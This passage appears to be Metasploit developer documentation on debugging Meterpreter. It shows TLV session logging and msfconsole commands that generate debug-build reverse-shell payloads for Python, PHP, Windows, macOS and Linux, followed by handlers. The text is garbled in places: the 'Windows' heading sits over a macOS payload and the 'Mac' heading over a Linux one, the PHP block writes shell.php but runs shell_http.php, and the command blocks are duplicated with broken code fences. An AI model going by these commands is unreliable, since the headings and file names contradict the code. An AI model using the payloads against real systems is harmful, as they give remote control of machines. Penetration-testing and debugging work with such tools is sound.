## Log Meterpreter TLV Packets
This can be enabled for any Meterpreter session, and does not require a debug Metasploit build:
```msf
msf6 > setg SessionTlvLogging true
SessionTlvLogging => true
```
### Python payload generation with Meterpreter
Example output:
```
use payload/python/meterpreter_reverse_tcp
generate -o shell.py -f raw lhost=127.0.0.1 MeterpreterDebugBuild=true MeterpreterTryToFork=false
to_handler

python3 shell.py
```

## Meterpreter debug builds
### PHP payload generation with Meterpreter

```
use payload/php/meterpreter_reverse_http
generate -o shell.php -f raw lhost=127.0.0.1 MeterpreterDebugBuild=true
to_handler

php shell_http.php
```


### Windows payload generation with Meterpreter

```
use osx/x64/meterpreter_reverse_tcp
generate -f macho -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
```

### Mac payload generation with Meterpreter

```
use linux/x64/meterpreter_reverse_tcp
generate -f elf -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
```

`msf
msf6 > setg SessionTlvLogging true
SessionTlvLogging => true
`

`
use payload/python/meterpreter_reverse_tcp
generate -o shell.py -f raw lhost=127.0.0.1 MeterpreterDebugBuild=true MeterpreterTryToFork=false
to_handler

python3 shell.py
`

`
use payload/php/meterpreter_reverse_http
generate -o shell.php -f raw lhost=127.0.0.1 MeterpreterDebugBuild=true
to_handler

php shell_http.php
`

`
use windows/x64/meterpreter_reverse_tcp
generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/Windows/Temp/foo.txt'

to_handler
`

`
use osx/x64/meterpreter_reverse_tcp
generate -f macho -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
`

`
use linux/x64/meterpreter_reverse_tcp
generate -f elf -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
`

